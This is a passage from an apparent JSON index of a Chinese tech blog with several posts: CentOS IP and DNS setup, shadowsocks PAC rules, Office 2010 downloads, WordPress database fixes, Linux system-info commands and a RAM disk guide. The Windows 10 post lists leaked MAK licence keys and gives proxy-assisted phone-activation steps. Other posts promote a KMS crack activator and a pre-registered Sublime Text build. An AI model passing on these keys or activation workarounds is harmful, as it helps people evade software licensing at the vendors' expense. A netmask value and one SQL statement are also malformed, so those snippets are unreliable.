（以上相关补充知识引自：http://www.clxp.net.cn/article.asp?id=2288）","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"CentOS7设置IP和DNS","slug":"set-network-in-centos7","date":"2016-05-08T08:20:37.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"set-network-in-centos7.html","permalink":"https://sobaigu.com/set-network-in-centos7.html","excerpt":"","text":"CentOS升级到7版后,有些命令变了,有些配置文件也跟着变了,最明显的是ifconfig这些工具是默认不装的,改成了ifcfg命令,service命令用法也要迁移到systemctl,有些小不适应. 因为下载的是Minimal镜像,装起来后缺的功能就更多了,装起来发现设置ip都不能一步完成,而且所处的环境还不能DHCP,有点懵,将CentOS7设置IP和DNS的过程记录一二,仅供参考. 设置IP及网关 CentOS7里已经找不到eth0了,所以ifcfg后面就不能像以前那样理所当然查看eth0,ifconfig命令设置ip了,我们需要设置ip就直接去改配置文件. 打开 network-scripts目录,去找ifcfg打头的配置文件. 1234[root@Centos ~]# cd /etc/sysconfig/network-scripts/[root@Centos network-scripts]# ll | grep ifc-rw-r--r--. 1 root root 360 4月 28 10:57 ifcfg-eno16777728-rw-r--r--. 1 root root 254 9月 16 2015 ifcfg-lo lo这种字符和以前在ifconfig里看到的一样,这个我们熟悉,那另外一个就是我们网卡的配置文件了. 12345678910111213141516171819202122[root@Centos network-scripts]# vi ifcfg-eno16777728TYPE=EthernetBOOTPROTO=none //忘记原先这里是啥了,按查到的资料改了下,没验证过改与不改有什么区别DEFROUTE=yesPEERDNS=yesPEERROUTES=yesIPV4_FAILURE_FATAL=noIPV6INIT=yesIPV6_AUTOCONF=yesIPV6_DEFROUTE=yesIPV6_PEERDNS=yesIPV6_PEERROUTES=yesIPV6_FAILURE_FATAL=noNAME=eno16777728 //网络连接名称依照硬件序列号来了,有强迫症的自己找资料,貌似要改的东西不少UUID=1a755e45-3018-4a91-a87e-937f1a1a4915DEVICE=eno16777728ONBOOT=yes#增加IPADDR，NETMASK，GATEWAYIPADDR=192.168.23.91PREFIX=24 //换成NETMASK的写法就是NETMASK=255.255.255.255.0GATEWAY=192.168.23.254 修改保存后,使用systemctl restart network.service命令重启网络即可. 设置DNS ip和网关设置好了,此时网络就通了,但如果要访问域名,我们还需要设置DNS.设置DNS有人直接在上面这个文件里加的,如: 12345......IPADDR=192.168.23.91PREFIX=24GATEWAY=192.168.23.254DNS1=119.29.29.29 上面的方法不知道对不对,但修改下面这个resolv.conf文件是一定可以的. 12345[root@Centos network-scripts]# cat /etc/resolv.conf###Generated by NetworkManagernameserver 119.29.29.29nameserver 8.8.8.8###还有其他DNS就往后加就行了 搞定网络,还是把ifconfig功能装起来吧,ifcfg有点不习惯. 其他通用设置方法参考: [Linux笔记]Linux命令行设置ip,DNS和gateway [Linux笔记]Ubuntu 12.04 LTS命令行设置IP及DNS","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"shadowsocks-添加PAC自定义规则","slug":"shadowsocks-rule","date":"2016-05-05T23:25:45.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"shadowsocks-rule.html","permalink":"https://sobaigu.com/shadowsocks-rule.html","excerpt":"","text":"shadowsocks 规则格式说明 shadowsocks 默认使用的 GFWList规则。 shadowsocks 默认使用的是 adblock plus 的引擎，要想自己添加规则最好熟悉一下其规则，下面是shadowsocks 的 pac 规则。 中文版： Adblock Plus 过滤规则 英文版： Adblock Plus filters explained 规则大概描述 通配符支持，如 *.example.com/* 实际书写时可省略 * 如 .example.com/ 意即 *.example.com/* 正则表达式支持，以\\开始和结束， 如 \\[\\w]+:\\/\\/example.com\\ 例外规则 @@，如 @@*.example.com/* 满足@@后规则的地址不使用代理 匹配地址开始和结尾 |，如 |http://example.com、example.com| 分别表示以 http://example.com 开始和以 example.com 结束的地址 || 标记，如 ||example.com 则 http://example.com 、https://example.com 、ftp://example.com 等地址均满足条件，只用于匹配地址开头 注释 ! 如 ! Comment 分隔符^，表示除了字母、数字或者 _ - . % 之外的任何字符。如 http://example.com^ ，http://example.com/ 和http://example.com:8000/ 均满足条件，而 http://example.com.ar/ 不满足条件 如何使用自定义规则 如果 GFWList 的自带规则无法满足你的需求，那么你需要PAC自定义规则。你可以点击 shadowsocks 选择『编辑GFWList的用户规则』项，使用编辑器打开user-rule.txt文件，在文件中加入你的规则，格式如下： 1234567! Put user rules line by line in this file.! See https://adblockplus.org/en/filter-cheatsheet||amazonaws.comatom.io 如上面的注释说明，user-rule.txt 一行只能有一条代理规则，上面的示例中 ||amazonaws.com 和 artstation.com 这种直接写的语法都是可以的，生效后被配置的域名及其子域名都会经过代理访问。 user-rule.txt中的规则并不能直接被shadowsocks使用，如要添加到user-rule.txt中的规则生效，你还要执行下面重要的一步：更新本地的PAC，更新后user-rule.txt中的自定义规则会添加到PAC.txt文件内。每次编辑完user-rule.txt后，均需执行从GFWList更新本地PAC，使本次规则也生效。 最新版本的Shadowsocks客户端，在保存user-rule.txt的时候将会自动完成更新到pac.txt。 其他 科学爬梯相关可见本站文章存档：shadowsocks","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"Microsoft Office 2010+Project 2010+Visio2010 32&64简体中文SP1版+集成方法","slug":"ms-office-pro-plus-2010-with-sp1-vol","date":"2016-05-01T15:49:11.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"ms-office-pro-plus-2010-with-sp1-vol.html","permalink":"https://sobaigu.com/ms-office-pro-plus-2010-with-sp1-vol.html","excerpt":"Microsoft Office 2010，是微软推出新一代办公软件，开发代号为Office 14，实际是第12个发行版。该软件共有6个版本，分别是初级版、家庭及学生版、家庭及商业版、标准版、专业版和专业高级版，此外还推出Office 2010免费版本，其中仅包括Word和Excel应用。除了完整版以外，微软还将发布针对Office 2007的升级版Office 2010。","text":"Microsoft Office 2010，是微软推出新一代办公软件，开发代号为Office 14，实际是第12个发行版。该软件共有6个版本，分别是初级版、家庭及学生版、家庭及商业版、标准版、专业版和专业高级版，此外还推出Office 2010免费版本，其中仅包括Word和Excel应用。除了完整版以外，微软还将发布针对Office 2007的升级版Office 2010。 Office 2010可支持32位和64位vista及Windows7，仅支持32位WindowsXP，不支持64位XP。Office Pro Plus 2010分为“VOL”和“零售”两大发行渠道。两种发行渠道，采用两种激活方式。其中，“VOL”版可用MAK密钥（永久激活）和KMS服务器（180 天激活）予以激活。 集成组件 Microsoft Access2010（数据库管理系统：用来创建数据库和程序来跟踪与管理信息）； Microsoft Excel2010（数据处理程序：用来执行计算、分析信息以及可视化电子表格中的数据）； MicrosoftInfoPath Designer 2010（用来设计动态表单，以便在整个组织中收集和重用信息） MicrosoftInfoPath Filler 2010（用来填写动态表单，以便在整个组织中收集和重用信息）； Microsoft OneNote2010（笔记程序：用来搜集、组织、查找和共享您的笔记和信息）； Microsoft Outlook2010（电子邮件客户端：用来发送和接收电子邮件；管理日程、联系人和任务；以及记录活动）； Microsoft PowerPoint 2010（幻灯片制作程序：用来创建和编辑用于幻灯片播放、会议和网页的演示文稿）； MicrosoftPublisher 2010（出版物制作程序：用来创建新闻稿和小册子等专业品质出版物及营销素材）； MicrosoftSharePoint Workspace 2010（相当于Office2007的Groove）； Microsoft Word2010（图文编辑工具：用来创建和编辑具有专业外观的文档，如信函、论文、报告和小册子）； Office Communicator 2007（统一通信客户端）等。 独立组件 Office Visio 2010（使用 Microsoft Visio 创建、编辑和共享图表。） Office Project2010（使用 Microsoft Project 计划、跟踪和管理项目，以及与工作组交流。） Office SharePointDesigner 2010（使用 SharePoint Designer 创建 SharePoint 网站） OfficeCommunicator 2007（统一通信客户端，集成到2010套件中）等。 集成独立组件的方法： step 1、首先去网上下载Microsoft Office2010集成SP1的原版及各个需要的组件(不需要做集成的同学下载单独组件就可以了,每个组件都是个完整的安装程序,最好下载完成后用hash工具校验下以确保文件正确)： Microsoft Office2010 VOL64位官方集成SP1版： SW_DVD5_Office_Professional_Plus_2010w_SP1_64Bit_ChnSimp_CORE_MLF_X17-76742.iso (1.5 GB) SHA1: 9D97B220739161CFF3147E169B702A056A6C7F51 Microsoft Office2010 VOL32位官方集成SP1版： SW_DVD5_Office_Professional_Plus_2010w_SP1_W32_ChnSimp_CORE_MLF_X17-76734.iso (1.32 GB) SHA1: 581ED02AC171DB18E80B277214AB6B952038F599 Project 2010 VOL64位官方集成SP1版： SW_DVD5_Project_Pro_2010w_SP1_64Bit_ChnSimp_MLF_X17-76658.iso (664.35 MB) SHA1: 23fe0ae6954fb59a274c983e9dbc2352cca70a38 Project 2010 VOL32位官方集成SP1版： SW_DVD5_Project_Pro_2010w_SP1_W32_ChnSimp_MLF_X17-76643.iso (587.54 MB) SHA1: e25ae102671abcc504cad219af5d3f553fe7c33b Visio 2010 VOL64位官方集成SP1版： SW_DVD5_Visio_Premium_2010w_SP1_64Bit_ChnSimp_Std_Pro_Prem_MLF_X17-75849.iso (735.03 MB) SHA1: 49210b3fe7437059513d60e79b6bc71b5df0d166 Visio 2010 VOL32位官方集成SP1版： SW_DVD5_Visio_Premium_2010w_SP1_W32_ChnSimp_Std_Pro_Prem_MLF_X17-75847.iso (643.38 MB) SHA1: 89252e480f66221ab11928a2753981b4293a83f0 step 2、安装最新版的winrar或是7zip，将Visio 2010、Project 2010分别解压缩备用。 step 3、用SHA1工具对比了一下Office2010、Visio2010、Project2010三个安装目录里相同目录中的文件，比如Admin、Catalog等目录里的文件，发现值都是一样的，所以用ultraiso打开下载的原版office2010的ISO，将Visio 2010、Project 2010解压缩的文件复制到ISO目录中，替换源文件即可。 step 4、保存文件退出，Office 2010原版安装文件中就已经集成Visio 2010、Project 2010组了。 以上链接可以直接点击链接下载,也可以复制电驴地址,然后在电驴中新建任务,粘贴创建即可. 提供一个网上流传比较广泛的激活工具,目前可用,网盘下载:HEU_KMS_Activator 激活工具使用其实很简单,自行网上搜索即可.","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"Sublime Text_绿色汉化特别版","slug":"software-sublime-text","date":"2016-04-30T07:31:13.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"software-sublime-text.html","permalink":"https://sobaigu.com/software-sublime-text.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文 文件大小：13 m 支持系统：Windows/Linux/OSX 官方主页：www.sublimetext.com 软件介绍 Sublime Text这款软件官方一直是英文界面没有提供中文，简体中文汉化特别版主要由 网友@流风清音 完成并发布！ Sublime Text 是个代码编辑器，也是HTML和散文先进的文本编辑器。Sublime Text 具有漂亮的用户界面和强大的功能，例如代码缩略图，Python的插件，代码段等。还可自定义键绑定，菜单和工具栏。Sublime Text 的主要功能包括：拼写检查，书签，完整的 Python API ， Goto 功能，即时项目切换，多选择，多窗口等等。Sublime Text 是一个跨平台的编辑器，同时支持Windows、Linux、Mac OS X等操作系统。 汉化版说明： by roustar31 基于 Sublime Text 3 官方版进行修改汉化 软件已默认注册且已去除自动检测升级提示 整合GBK插件支持简体中文整合多款主题及细节优化 整合Git、DocBlockr、MarkdownPreview、ColorPicker、AllAutocomplete等插件 参考清风流音的汉化，清除个人信息 - 完全绿色便携化，并整合注册码 by 流风清音 基于官方版进行全网最完美汉化，基本上没什么英文了。 已默认注册软件无需购买，有钱的程序员可以支持正版。 去除程序自动检测升级，即无更新选项也没有升级提示。 调整字体大小自动换行等细节，以符合大众的使用习惯。 修正中文输入法鼠标跟随问题，深度整合GBK编码插件。 修改多处菜单选项和配置文件，使其更加实用更人性化。 集成多种常用插件其详细如下（不需要的请自行删除） 中文文件名显示方框问题处理 这个问题在高分屏下设定显示放大就会触发，解决方法： Preferences&gt;Settings-User，配置中加上：&quot;dpi_scale&quot;: 1.0 1234567891011&#123; &quot;color_scheme&quot;: &quot;Packages/User/SublimeLinter/Big Duo (SL).tmTheme&quot;, &quot;dpi_scale&quot;: 1.0, //强制放大倍数为1 &quot;font_size&quot;: 12.0, &quot;ignored_packages&quot;: [ &quot;Vintage&quot; ], &quot;update_check&quot;: false, &quot;word_wrap&quot;: &quot;auto&quot;&#125; 重启Sublime Text即可看到正常中文文件名了。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 yl4r","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"解决文章无法定时发布或无法更改状态问题","slug":"wordpress-post-at-future-always","date":"2016-04-26T15:48:48.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"wordpress-post-at-future-always.html","permalink":"https://sobaigu.com/wordpress-post-at-future-always.html","excerpt":"","text":"最近折腾WordPress,把以前自己收藏的一些文章整理了下,都发布到自己的小站上. 今日遇到一篇文章死活无法发布,怎么搞都是定时状态.改包状态到草稿,可发布按钮那始终显示定时. 切到文章页面或者定时分类,点快速编辑,这里倒是有更改选中,可更新后返回再看,还是定时状态… 本想将此文章删除重发,但想想之前已经发布过了,且有人访问了,还是麻烦点,打开了phpmyadmin修改了下mysql,具体方法如下: 登陆你的空间管理后台,打开phpmyadmin管理界面,选中数据库,点击wp_posts(默认叫这名,前缀是啥自己装数据库的时候可以定义). 打开此表可见记录了我们网站所有的文章,当然,也包括了这篇文章的状态,我们可以逐页翻页找,当然也可以用语句找了,推荐用语句,只要简单的select就好了: 123SELECT *FROM `wp_posts`WHERE post_title = &#x27;文章标题&#x27; 点击执行,我们可以找到这篇文章相关的数据,其中有个&quot;post_status&quot;字段,此字段下大致有:inherit,future,draft,future等状态,如果你的文章是定时的那一定是future状态了. 知道各状态的字段,那么我们有较多文章时可以用查找状态语句列出来: 1234SELECT *FROM wp_postsWHERE `post_status` LIKE &#x27;future&#x27;LIMIT 0 , 30 此时我们需将future更改为发布:publish,更改方法可以用语句,也可以直接点击左侧的编辑图标,更改语句如下: 12UPDATE `数据库名`.`wp_posts` SET `post_status` = &#x27;publish&#x27;WHERE `wp_posts`.`ID` =491 LIMIT 1 ; id=491是我文章的id,请换成自己文章的id.如果是较多文章,那么可以用以下语句一次完成: 12UPDATE `数据库名`.`wp_posts` SET `post_status` = &#x27;publishWHERE `post_status` LIKE &#x27;future&#x27; 不放心用sql语句,干脆用图形界面方法更改文章状态。同样,改完点执行,然后返回你的网站前台或者后台即可看到效果. 当然,定时发布不成功看下你的WordPress设置的时区是否对的,在设置&gt;常规&gt;时区,那里可见当前时间,调整时区或者耐心等待,实在不行就按以上方法改数据库吧.","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"Ubuntu的root账号密码","slug":"root-in-ubuntu","date":"2016-04-26T02:32:56.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"root-in-ubuntu.html","permalink":"https://sobaigu.com/root-in-ubuntu.html","excerpt":"","text":"Ubuntu系统装好后,默认一定要新建一个用户,且密码格式还有要求,一些弱密码不让设置. 进入系统后,你会发现用sudo的时候不能用新建用户的密码,也不能直接设置root的密码,会提示密码不对或者禁止对root进行passwd设置. 原来Ubuntu默认root账号是在安装系统的时候生成了一个随机密码.此时如果你想用root账号,需要在终端对登录账号重新设置一次密码,然后就可以用passwd设置root密码了,真是个奇怪的设计╮(╯▽╰)╭","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"计算机启动原理","slug":"computer-start","date":"2016-04-21T15:49:08.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"computer-start.html","permalink":"https://sobaigu.com/computer-start.html","excerpt":"","text":"一篇无意从网络上找到的文章,原地址已不祥,发现写得很精彩。 当你开启电脑时，它发生了什么？ 一台没有软件运行的电脑只是一堆发热的电子器件。当计算机起电启动开始的第一件 事情就是运行一个叫做“操作系统”的特殊程序。操作系统的作用就是帮助其他的程序能够 的控制和访问计算机硬件。 装入操作系统的步骤叫作引导(booting)。(从严格意义上说，引导和自我检查的 处理步骤叫做“自检”)。您的计算机知道如何去引导，因为在其具体的操作方法已经 集成在一块称做 BIOS(或者叫基本输入输出系统)的芯片中了。 BIOS 芯片告诉计算机查看一个合适的地方引导系统，通常这个地方在编号最小的磁盘 上(引导盘)。一个称做引导器的程序(在 Linux 下通常是 Grub 或者是 LILO)会被装入 内存，并且启动。引导器的作用就是装入真正的操作系统。 接下来引导器会寻找一个内核，并将它装入内存后运行它。当你启动 Linux 的时候， LILO 会在系统屏幕上打印出一些小点，这说明它正在装入内核。(每一个点的意思就是已经 引导读取了磁盘上所指向内核的簇)。 (你可能会感到困惑，为什么 BIOS 不会直接引导系统，而舍直求曲的分成两个步骤呢？ 事实上 BIOS 不是非常的智能，甚至可以说是有点木讷。因此 Linux 内核会在引导以后不再 使用它。这是因为这个程序是为有八字节限制的 PC 而写的，并且 BIOS 容量也有限制。 所以可能在引导的时候不能读取磁盘的後余的扇区。与此相比，引导程序却可以允许你引导磁盘上不只一个操作系统。(虽然它可以引导其他的 UNIX 系统，但是通常不会这么 做。) 当内核启动以后，它会自动检查和初始化硬件，并且准备运行程序。它通过一些 I/O 端口、特殊的总线查找硬件，而非一般的内存地址。这是因为这些总线通常它们会有控制卡监听并执行相应的命令。内核检查硬件不是随机的，它有一套内建的机制去处理它：哪里去寻找硬件，怎样控制正常使用的硬件等等。这个步骤称为自动检查(autoprobing)。 在内核自检的时候你会从屏幕上看到很多的信息，这是内核正在通过上述的 I/O 端口自动检查硬件，指出你的机器上有哪些可用的硬件并组织好它们。Linux 非常擅长于做 这些事情，这个功能相对来说比一些其他的 UNIX 系统要好，和 DOS 或者 Windows 来说要 好的多。事实上，许多 Linux 老用户会认为内核并不需要那么智能的检查硬件(即使这样可以容易安装系统)，这是因为他们有一个非常好的理由让那些吹毛求丝的用户跳出的无聊的 自由代码实验。 但是内核完全载入并且运行完毕并不是引导的结束；这仅仅是第一个阶段(有时被称做 运行级别一，run level 1)。在运行完运行级别一以后，内核回将控制权转交给一个 叫做 init 的程序，它将启动一些用户进程。 Init 进程所做的第一件事情就检查你磁盘的完整性。磁盘文件系统是一个非常重要的； 如果它们因为硬件问题或者是突然断电，那就有一个非常好的理由在 UNIX 系统引导前 检查并且修复它们。我们会等会详细的讨论文件系统为什么会损坏。 Init 接下来的事情就是启动一些精灵进程(daemon)，比如打印控制控制系统、邮件 ***、或者是一个 WWW 服务器。精灵进程会在后台(background)运行，监视指定所要做的 事情。这些特殊的程序经常会相互处理所需要的请求，避免冲突。它们之所以是精灵进程， 是因为它们容易写成一个程序集合用来应答和处理所有需要的服务，而非为了一个同样的请求又去启动另外一个新的进程。精灵程序所生成的每一个进程将处理一个任务并且同时运行，而不影响别的进程。在每个系统上运行的精灵程序是不同的，但是通常都有一个打印监视进程 (一个控制你打印机的精灵进程)。 下一步就是为用户准备了。Init 开启一个名叫 getty 的进程监视你的控制台(console)(也许是一个拨号接 入的端口)。这个程序会在你的终端提供一个登陆符让您登陆系统。当所有的精 灵进程和 getty 进程在每个终端启动完毕，我们就处在了运行级别二(run level 2)。这时，在 这个级别下你可以登陆并且运行程序了。 但是事情并没有完，下一步就时开启一些别的有用的程序，比如网络和其他的一些服务。 当这些全部完成以后，我们所处在的是级别三运行模式(run level 3)，并且这时系统就 完全可以使用了。","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[]},{"title":"outlook删除邮箱账号","slug":"delete-account-from-outlook","date":"2016-04-18T04:29:07.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"delete-account-from-outlook.html","permalink":"https://sobaigu.com/delete-account-from-outlook.html","excerpt":"","text":"换个电脑,没想把原来的系统重新格式化了,为安全着想想把outlook账户删除掉,结果还折腾了一番.以前都是直接把硬盘格式化了重装系统,所以没折腾过,没想到要从outlook删除邮箱账号也不是件简单的事. 直接在outlook账户设置中删除账户的时候会有下面这种提示: 在删除包含您的个人邮件、联系人及日历数据的电子邮件帐户前，必须创建新的位置来存放您的数据… 不知道微软为啥要这样设计,删个账号还这么费劲…可怜的是找到微软的帮助页面居然是上面的那个删除方法,但人家根本没提这样删除不了,估计写文档的人也没实际操作过. 要删除账号,只需要两步: 1.删除系统邮箱配置 打开控制面板&gt;搜索&quot;邮件&quot;&gt;配置文件&gt;删除outlook的配置文件 //这个邮件设置入口比outlook程序进去多了个配置文件的管理入口 此时打开outlook就不会打开你之前设置的邮箱了,但此时之前下载到本地的文件还保留在邮箱数据文件里的,我们需要将其一并删除. 2.删除已下载的邮件 C:\\Users\\登陆的用户名\\AppData\\Local\\Microsoft\\Outlook 以上位置为win10上的默认位置,win7以上版本应该都一样的,xp就懒得贴了,自己找吧,是一个跟邮箱地址同名的OST后缀文件,该文件就是原邮箱的邮件保存位置了,彻底删除掉吧.","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Linux查看系统信息命令","slug":"linux-command","date":"2016-04-16T15:48:59.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"linux-command.html","permalink":"https://sobaigu.com/linux-command.html","excerpt":"","text":"1234567head -n 1 /etc/issue #查看操作系统信息命令cat /proc/cpuinfo #查看CPU信息free -m #查看内存使用量grep MemTotal /proc/meminfo #查看内存总量uptime #查看系统运行时间、用户数、负载df -h #查看磁盘各分区使用情况fdisk -l #查看所有分区 有些在freebsd下也能用… 1234567891011121314151617181920212223242526uname -a #查看内核/操作系统/CPU信息head -n 1 /etc/issue #查看操作系统版本cat /proc/cpuinfo #查看CPU信息hostname #查看计算机名lspci -tv #列出所有PCI设备lsusb -tv #列出所有USB设备lsmod #列出加载的内核模块env #查看环境变量资源free -m #查看内存使用量和交换区使用量df -h #查看各分区使用情况du -sh &lt;目录名&gt; #查看指定目录的大小grep MemTotal /proc/meminfo #查看内存总量grep MemFree /proc/meminfo #查看空闲内存量uptime #查看系统运行时间、用户数、负载cat /proc/loadavg #查看系统负载磁盘和分区mount | column -t #查看挂接的分区状态fdisk -l #查看所有分区swapon -s #查看所有交换分区hdparm -i /dev/hda #查看磁盘参数(仅适用于IDE设备)dmesg | grep IDE #查看启动时IDE设备检测状况网络ifconfig #查看所有网络接口的属性iptables -L #查看防火墙设置route -n #查看路由表netstat -lntp #查看所有监听端口netstat -antp #查看所有已经建立的连接netstat -s #查看网络统计信息进程&lt;span&gt;","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"电话激活密钥_Windows 10_专业版/企业版_MAK密钥及其激活要点说明","slug":"windows-10-active-key","date":"2016-04-15T05:26:56.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"windows-10-active-key.html","permalink":"https://sobaigu.com/windows-10-active-key.html","excerpt":"","text":"电话激活密钥 Windows10 专业版和企业版的MAK不能通用，这一点与Windows8.1/8/7的MAK密钥不同。本文转载收集两枚MAK密钥分别对应Windows10的专业版和企业版，目前尚无激活次数，前面介绍过只要MAK密钥没有被封杀，就可以使用微软的客服电话进行永久激活。 Windows 10专业版 MAK密钥： NT69K-9XGX4-9K2MH-H8HTC-CKCKM Windows 10 企业版 MAK密钥： CN8B4-YQTJ7-CGYH6-83F43-MDWWR MDPBJ-GNRT7-TTDK3-8CFYF-QGPJR 新增两枚： 8N647-YXDJB-FY3VB-VPQQP-P9XR4 QDCTR-DN7RJ-GXPRJ-K9T9B-88F8R 激活要点说明 针对MAK密钥复活，包括Windows 8.1、Office 2013等，由于使用量较大，现很多已经“归0”。这里提示一下，复活时间大约一般为下午，需要的朋友需要时刻关注，使用密钥检测工具PIDKey进行检测。对于暂时“归0”的MAK密钥，虽然不能直接联网激活，但是仍然可以通过微软客服电话予以激活。下面介绍一下具体流程及其操作方法 前提条件： 1、需要能听懂英文数字 2、准备好Skype（拨打免费电话用） 3、使用代理软件将ip代理成非大陆区(有时候需要)，推荐用shadowsocks 4、已准备好激活密钥 操作方法： 1、以管理员身份运行“命令提示符”导入密钥，命令：slmgr -ipk XXXXX-XXXXX-XXXXX-XXXXX-XXXXX 2、继续输入命令：slui 4，弹出对话框点击下一步，即可看到“安装ID”，需要记录下来，下面要用。 3、运行VPN代理上网，然后运行Skype，拨打英国免费电话：800-0188354 4、拨通后，客服会随机说两个数字，要求输入后再进行电话激活过程。 5、接着键入数字“1”进行激活，然后键入“#”跳过说明（按两次）。接着听到“Please enter the first group now”即可输入上面准备好的“安装ID”，一共9组分别输入即可，每输入一组会听到“Thank you”，如果没有听清楚可以按“*”重复。 6、输入完安装ID后，客服会问到“On how many computers is your product currently installed?”，这时输入数字“1”即可。 7、接下来客服会依次提供激活ID，总共8组数字，听清楚后按“#”继续，否则按“*”重复听。输入激活ID后，Windows和Office即可完美激活。 ——上述步骤看似复杂，实际很简单，只要掌握操作要领，可以轻松+愉快地完成！ 注意事项 1、密钥一定不能被封杀，否则无法激活，事先可使用密钥检测工具PIDKey检测。 2、安装ID和激活ID不能弄错，否则无法激活。 3、激活过程中一定严格按照上述步骤，不能按错键。 如果觉得电话激活太麻烦，可以试试kms激活，也挺好的，激活工具：HEU_KMS_Activator","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"让4G以上内存充分使用","slug":"use-your-ram-bigger-than-4g","date":"2016-04-06T15:49:04.000Z","updated":"2024-09-28T00:17:21.258Z","comments":true,"path":"use-your-ram-bigger-than-4g.html","permalink":"https://sobaigu.com/use-your-ram-bigger-than-4g.html","excerpt":"","text":"现在内存便宜了,买机器配的内存越来越大,4G以上内存已经是普遍现象,相对于咱几年前的老爷机,真是羡煞旁人. 可咱一般用的是32位系统,4G内存只能用到3.2G或者3.5G,具体原因可自行搜索&quot;4G内存只显示3.5G&quot;,由此可知,剩下的内存都在睡觉了. 即便是加PAE参数羡煞扩展认到了,一般情况下装个Windows7系统,效果全开,系统也就用掉1g,其他乱七八糟的程序再耗掉1G,还能剩不少,还是有点浪费吧.内存有了,放那睡觉,罪过啊.既然有资源,咱就把它充分利用起来. 最好的用途莫过于把内存当硬盘了,具体用到的工具推荐使用:SuperSpeed.RamDisk.Plus. 大家都知道,硬盘数据写多了是容易损坏的,用久了逻辑错误甚至是坏道等都会出现.而内存就没有这些问题,而且速度比硬盘快,不在一个等级. 下载SuperSpeed.RamDisk,安装完成后可以添加一个内存盘,4G内存建议是设置1G,反正放那不用也是浪费.添加完成后把ie缓存路径,谷歌chrome等缓存路径指向刚才添加的内存盘,这样一些垃圾文件就不会伤到硬盘了,也不需要定期清理垃圾文件.当然,系统的缓存也可以放里面,通过我的电脑&gt;属性&gt;高级设置&gt;环境变量,更改好后重启就行了. 这里提醒下,由于内存断电后数据是无法保留的,所以一些需要的缓存也无法保留.可谁需要保留缓存呢? :mrgreen: 本站提供一个据说是4G以上内存专用版本的SuperSpeed.RamDisk.Plus,使用后没感觉有多大区别,唯一不同的是这个版本最大只能设置系统认不到的那部分内存,设置完成后会多出一个内存盘,系统显示的可用内存也不会减少,说明这些内存来自于系统认不到的那部分. 点击链接下载:SuperSpeed.RamDisk.Plus_4G.7z 使用方法:下载附件,解压至程序保存路径,然后双击ramdisk.exe,右边选择安装内存盘,选择盘符及大小,点确定,该重启重启,大功告成. 提供一个chrome设置缓存的注册表: 12345678910111213Windows Registry Editor Version 